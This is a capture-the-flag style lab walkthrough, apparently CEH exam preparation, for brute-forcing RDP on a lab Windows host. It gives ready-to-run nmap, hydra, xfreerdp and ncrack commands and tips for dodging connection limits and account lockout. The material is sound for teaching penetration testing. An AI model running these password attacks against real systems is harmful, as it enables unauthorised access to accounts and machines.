# Scenario 16 — RDP brute force to Documents flag

**Difficulty:** 🟡 | **Time:** ~25 min | **Domains:** 02, 06, 13
**Tools:** [nmap](../../tools/nmap.md), [hydra](../../tools/hydra.md), [xfreerdp](../../tools/crackmapexec.md)

## Story
You're given target 10.10.10.16 (Windows workstation). Credentials leaked a username `admin`. Find the flag inside `C:\Users\admin\Documents\flag.txt`.

## Step 1 — Confirm RDP is open
**What we're doing:** Verify port 3389 is exposed before wasting time brute-forcing.
```bash
nmap -p 3389 -sV 10.10.10.16
```
**Expected finding:** `3389/tcp open  ms-wbt-server Microsoft Terminal Services`.
**→ Tool ref:** [nmap scan techniques](../../tools/nmap.md#scan-techniques)

## Step 2 — Fingerprint to avoid NLA lockouts
**What we're doing:** NLA-enforced hosts will auth-fail fast and may lock accounts.
```bash
nmap -p 3389 --script rdp-ntlm-info,rdp-enum-encryption 10.10.10.16
```
**Expected finding:** Target OS build, whether CredSSP/NLA is required.
**→ Tool ref:** [nmap NSE](../../tools/nmap.md#nse-scripts-the-money-section)

## Step 3 — Brute force RDP with hydra
**What we're doing:** Dictionary attack against the `admin` user using rockyou.
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.16 -t 4 -f
```
**Expected finding:** `[3389][rdp] host: 10.10.10.16   login: admin   password: <pw>`.
**→ Tool ref:** [hydra rdp module](../../tools/hydra.md#rdp)

## Step 4 — Log in with xfreerdp
**What we're doing:** Interactive session to the victim desktop.
```bash
xfreerdp /v:10.10.10.16 /u:admin /p:'<pw>' +clipboard /cert:ignore
```
**Expected finding:** Windows desktop.

## Step 5 — Read the flag
**What we're doing:** Navigate to Documents and cat the flag.
```cmd
type C:\Users\admin\Documents\flag.txt
```

## Step 6 — Final answer
**Answer format:** the flag string (e.g. `CEH{...}`)

## Gotchas across this chain
- Limit hydra to `-t 4` — RDP drops connections above 4-6 parallel tasks.
- If NLA is enforced, `xfreerdp /sec:nla` is required; older `rdesktop` will fail.
- Account lockout policy often triggers at 5 failed attempts — use `-f` to stop on first hit.
- If hydra says "all children were disabled", switch to `ncrack -p 3389 --user admin -P rockyou.txt 10.10.10.16`.

## Variant questions this scenario teaches
- "What is the password of user X on host Y?"
- "What is the Windows build number?" (from rdp-ntlm-info)
- "What is stored in the Administrator Documents folder?"

